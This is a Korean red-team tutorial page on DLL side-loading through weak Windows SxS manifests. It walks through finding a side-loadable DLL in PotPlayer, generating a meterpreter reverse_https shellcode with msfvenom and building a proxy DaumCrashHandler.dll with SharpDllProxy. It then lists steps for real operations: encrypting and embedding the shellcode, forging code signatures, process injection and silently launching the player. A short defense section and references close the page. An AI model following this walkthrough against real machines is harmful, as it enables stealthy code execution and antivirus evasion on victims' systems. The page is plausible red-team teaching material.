# DLL 사이드로딩 (DLL Side-Loading)

## 배경 - 윈도우 SxS 매니패스트

윈도우 운영체제의 실행파일들은 의존성 지옥(DLL Hell, Dependency Hell) 문제를 겪을 때가 있다. 실행파일이 DLL을 로드해야할 때, 어떤 이름의 DLL을, 어디서, 어떤 버전으로 로드를 해야할지 헷갈릴수 있다. 컴퓨터들마다 가지고 있는 DLL도 다르고, 다운 받아 놓은 DLL도 있을 수 있다. 같은 이름이지만 버전은 다른 DLL 또한 동시에 파일시스템에 존재할 수 있다.

[**SxS 어셈블리**](https://learn.microsoft.com/en-us/windows/win32/sbscs/about-side-by-side-assemblies-)는 위 문제를 해결하기 위해 실행파일이 로드할 DLL, 클래스, 타입 라이브러리 등을 묶어놓은 리소스들이다. 간단하게 생각하면 필요한 DLL을 모두 하나의 택배 상자에 넣어놓은 그런 개념이라고 볼 수 있다.

[**Windows Side-by-Side (SxS) Manifest**](https://learn.microsoft.com/en-us/windows/win32/sbscs/assembly-manifests) (윈도우 SxS 매니패스트) 파일은 위에서 언급된 SxS 어셈블리들을 명시적으로 기재해놓은 파일이다. 어플리케이션이 실행시 어떤 이름과 버전의 실행파일과 DLL을 로드해 사용할지를 XML 형태로 저장해놓은 파일이다.

이해를 돕기 위한 Windows SxS 매니패스트 예시는다음과 같다.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>

<!-- 매니패스트가 적용될 어플리케이션 지정 -->
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity
      version="1.0.0.0"
      processorArchitecture="x86"
      name="CompanyName.ProductName.ApplicationName"
      type="win32"/>
	
	<!-- 로드될 DLL의 버전, 아키텍쳐, 공개키 토큰 지정 -->
	<dependency>
    <dependentAssembly>
      <assemblyIdentity
          type="win32"
          name="Microsoft.Windows.Common-Controls"
          version="6.0.0.0"
          processorArchitecture="x86"
          publicKeyToken="6595b64144ccf1df"
          language="*"/>
    </dependentAssembly>
  </dependency>
</assembly>
```

## DLL Sideloading (DLL 사이드로딩)

DLL 사이드로딩은 특정 어플리케이션/실행파일의 윈도우 SxS 매니패스트 파일이 로드될 SxS 어셈블리(DLL인 경우가 많다)의 이름, 버전, 공개키 토큰 등을 명시적으로 기재해놓지 않은 경우, 이름만 같은 공격자의 가짜 DLL을 만들어 정상 DLL 말고 공격자 DLL을 실행파일에 로드하는 공격이다.

SxS 매니패스트 파일이 명시적으로 DLL의 이름, 버전, 공개키 토큰등을 기재해놓지 않은 경우, 윈도우 운영체제의 로더는 프로세스 생성/시작 시 운영체제의 DLL Search Order에 따라서 DLL을 로드하게 된다. 이때 DLL Hijacking과 비슷하게, 가장 최상단 우선순위에 있는 `실행파일과 동일한 디렉토리에 위치한 DLL` , 즉, 공격자의 DLL이 로드되게 된다. 원래라면 SxS 매니패스트 파일에 지정해놓은 DLL의 버전 종류와 코드 서명과 관련된 공개키 토큰이 다르기 때문에 로드가 거부되어야한다. 하지만 SxS 매니패스트 파일 자체가 없거나, 취약하게 만들어졌다면 별다른 문제없이 DLL이 로드된다.

DLL 사이드로딩에 취약한 윈도우 SxS 매니패스트 파일은 다음과 같이 생겼다.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity
      name="ApplicationName"
      processorArchitecture="*"
      version="1.0.0.0"
      type="win32"/>
  
  <!-- 취약한 의존성 명시의 예. DLL의 버전 및 공개키 토큰이 없음! -->
  <dependency>
    <dependentAssembly>
      <assemblyIdentity
          type="win32"
          name="SomeDLLtoLoad"
          processorArchitecture="*"/>
    </dependentAssembly>
  </dependency>
</assembly>
```

## 무기화&#x20;

공격자의 DLL이 로드된 후, 공격자는 원하는 방식으로 페이로드를 실행할 수 있다. `DLLMain`에서 실행하는 방법도 있지만, 이 경우 윈도우 로더의 Loader Lock 문제에 직면에 다양한 이유 때문에 페이로드 실행이 안되거나, deadlock 문제가 발생할 수 있다 - [링크](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-best-practices#general-best-practices). 하지만, 레드팀의 에이전트를 실행하는 것이 아니라 간단한 페이로드를 1회성으로 실행할 때에는 큰 문제가 되지는 않는다.

1. `DLL_PROCESS_ATTACH`에서 쓰레드를 만들어 페이로드 실행
2. `DLL_PROCESS_ATTACH`에서 프로세스 인젝션을 통해 다른 프로세스에서 페이로드를 실행
3. 실행파일이 진짜 DLL의 exported 함수를 사용할때 해당 함수를 후킹해 페이로드 실행 후 진짜 DLL로 리다이렉트 처리

아래 스크린샷은 #1번의 예시이다.

![출처: https://www.flangvik.com/2019/07/24/Bypassing-AV-DLL-Side-Loading.html 를 기반으로 수정한 다이어그램](../.gitbook/assets/dllsideloading.drawio.png)

### 실습

실습은 K사의 32비트 기반 동영상 플레이어 프로그램을 기반으로 진행한다. 이와 관련된 연구는 이미 [2019년도에 공개](https://github.com/mandiant/DueDLLigence)되었으며, DLL 사이드로딩은 제로데이가 아닌 윈도우의 기능을 이용하는 방법일 뿐임을 알린다. **심지어 마이크로소프트사에서는 이를 취약점으로 인정하지 않기 때문에 패치도 없다!** 연구자들이 발표한 특정 DLL의 사이드로딩은 패치가 되어 막혔지만, 다른 라이브러리를 사이드로딩해 이를 우회할 수 있다.

#### DLL 사이드로딩 정보 수집

먼저 ConsciousHacker의 [WFH툴](https://github.com/ConsciousHacker/WFH)을 이용해 PE바이너리가 어떤 라이브러리들을 로딩하는지, 그 라이브러리들 중 어떤 라이브러리가 사이드로딩이 가능한지 확인한다.

```
PS C:\opt\WFH> python .\wfh.py -t "C:\Program Files (x86)\DAUM\PotPlayer\PotPlayerMini.exe" -m dll
==================================================
Running Frida against C:\Program Files (x86)\DAUM\PotPlayer\PotPlayerMini.exe
--------------------------------------------------
        [+] Potential DllMain Sideloading: LoadLibraryW,LPCWSTR: C:\Program Files (x86)\DAUM\PotPlayer\PotPlayer.dll
        [-] Potential DllExport Sideloading: GetProcAddress,hModule : C:\Program Files (x86)\DAUM\PotPlayer\PotPlayer.dll, LPCSTR: PreprocessCmdLineExW
        < ... >
        [+] Potential DllMain Sideloading: LoadLibraryW,LPCWSTR: C:\Program Files (x86)\DAUM\PotPlayer\DaumCrashHandler.dll
        [-] Potential DllExport Sideloading: GetProcAddress,hModule : C:\Program Files (x86)\DAUM\PotPlayer\DaumCrashHandler.dll, LPCSTR: SetCrashHandler
        [-] Potential DllExport Sideloading: GetProcAddress,hModule : C:\Program Files (x86)\DAUM\PotPlayer\DaumCrashHandler.dll, LPCSTR: GetCrashHandler
        < ... >
```

이외에도 `DllMain` 과 `DllExport` 가 모두 사용 가능한 라이브러리들이 많이 나오지만, 일단 `PotPlayer.dll` 과 `DaumCrashHandler.dll` 에 주목한다. `PotPlayer.dll` 은 공개된 연구 이후 패치를 더해 사이드로딩이 막혔지만, `DaumCrashHandler.dll` 은 사이드로딩이 가능하다. 사이드로딩이 가능하다는 정보를 수집했으니 쉘코드와 프록시 DLL 생성 단계로 넘어간다.

#### 프록시 DLL 생성

DLL 생성 전, 공격에 사용될 쉘코드를 만든다. .NET 어셈블리를 donut 형태로 만들수도 있지만, 간단한 PoC를 위해 msfvenom을 이용해 meterpreter 쉘코드를 작성한다. 32비트 기반 프로그램과 DLL이기 때문에 쉘코드도 x86로 만든다.

```
msfvenom -p windows/meterpreter/reverse_https -f raw lhost=192.168.40.182 lport=443 -o meter-x86.bin
```

이후 DLL과 쉘코드를 한 디렉토리에 옮긴 뒤, FlangVik의 [SharpDLLProxy툴](https://github.com/Flangvik/SharpDllProxy)을 이용해 프로그램에 로드가될 공격자의 프록시 DLL을 생성한다.

```
# .\SharpDllProxy.exe --dll .\DaumCrashHandler.dll --payload .\meter-x86.bin

< ... > 

# ls


    Directory:
    C:\opt\SharpDllProxy\SharpDllProxy\bin\Debug\netcoreapp3.1\output_DaumCrashHandler


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          7/1/2022   6:35 PM           2444 DaumCrashHandler_pragma.c
-a----          7/1/2022   6:35 PM         131232 tmp4405.dll
```

그러면 DLL 1개와 `.c` 소스코드 1개가 생긴다. 이 `tmp4405.dll` 이라는 파일은 이름이 바뀐 원래 `DaumCrashHandler.dll` 파일이다. 프록시 DLL이 될 파일은 `DaumCrashHandler_pragma.c` 이며, VS나 MVSC, CMake 등을 이용해 컴파일 해서 DLL로 만들면 된다.

이제 준비된 파일들은 다음과 같다:

* PotPlayerMini.exe - 실제로 실행될 PE 바이너리
* tmp4405.dll - 원래 `DaumCrashHandler.dll` 파일. 이름만 바뀐 형태다.
* DaumCrashHandler.dll - 공격자가 생성해낸, attach 시 쉘코드를 실행하는 프록시 DLL
* meter.bin - raw 형태의 쉘코드 파일. DaumCrashHandler.dll 가 attach이 이 쉘코드가 실행된다.
* PotPlayer.dll - PotPlayerMini.exe가 실행할 때 꼭 필요한 라이브러리

이제 이를 실행시키면 다음과 같은 형태로 코드 실행이 일어난다.

1. PotPlayerMini.exe 파일이 실행되며 LoadLibrary를 이용해 DaumCrashHandler.dll 을 로드
2. DaumCrashHandler.dll 은 attach 되는 즉시 같은 디렉토리내의 meter.bin을 읽어와 실행
3. PotPlayerMini.exe가 DaumCrashHandler.dll에서 사용하고 싶은 함수들은 모두 실제 DLL인 tmp4405.dll 에게 프록시되어 실행

암호화되지 않은, 기본적인 meterpreter 쉘코드와 인터넷에 공개되어 있는 PoC를 기반으로 실행한 DLL 사이드로딩의 결과는 다음과 같다.

![](../.gitbook/assets/dll-sideloading.gif)

### 작전보안과 무기화

위는 PoC 형태기 때문에 실제 작전에서 쓰이기에는 부족하다. 작전보안이나 무기화를 위해서는 다음과 같은 것들을 준비해야한다:

1. meter.bin을 파일시스템에 드랍하는 것이 아닌, 쉘코드 형태로 DaumCrashHandler.dll 안에 넣어서 실행
2. meter.bin 쉘코드를 암호화 한 뒤, 런타임 중 복호화해 실행
3. 프록시 dll인 DaumCrashHandler.dll 파일에 [LimeLighter](https://github.com/Tylous/Limelighter)등의 툴을 이용해 디지털 서명 부과
4. 메인 프로세스에 쉘코드를 로드하는 방식이 아닌 프로세스 인젝션을 통해 다른 프로세스에 인젝션
5. PotPlayerMini.exe, tmp4405.dll, DaumCrashHandler.dll, PotPlayer.dll을 타겟 호스트에 같이 드랍하기 편하도록 압축 + 암호화 진행. 이후, 초기 침투 페이로드에서 코드 실행을 이용해 압축을 풀고 복호화를 진행한 후, PotPlayerMini.exe의 창이 보이지 않도록 silent 하게 실행

### 대응 방안

DLL 사이드로딩의 경우 블루팀이 이를 막는 방법도 있지만, 근본적으로는 소프트웨어 개발자 분들이 이를 원천봉쇄해야한다. DLL manifest 파일을 생성해 정해진 이름과 해시값의 DLL만 프로그램에 로드될 수 있도록 하는 것이 좋다.

엔드 유저의 입장에서는, 어쨌든 공격자는 초기 침투 이후에 DLL 사이드로딩 기법을 사용하기 때문에 공격자에게 초기 침투 기회 자체를 제공하지 않는 것이 좋다.

더 자세한 대응 방안을 위해서는 아래 Fireeye사의 레퍼런스의 페이지 10\~11을 참고한다.

### 레퍼런스

{% embed url="https://learn.microsoft.com/en-us/windows/win32/sbscs/about-side-by-side-assemblies-" %}

{% embed url="https://learn.microsoft.com/en-us/windows/win32/sbscs/assembly-manifests" %}

{% embed url="https://redteaming.co.uk/2020/07/12/dll-proxy-loading-your-favorite-c-implant/" %}

{% embed url="https://github.com/ConsciousHacker/WFH" %}

{% embed url="https://github.com/Flangvik/SharpDllProxy" %}

{% embed url="https://hijacklibs.net/" %}

{% embed url="https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows" %}

{% embed url="https://www.mandiant.com/sites/default/files/2021-09/rpt-dll-sideloading.pdf" %}
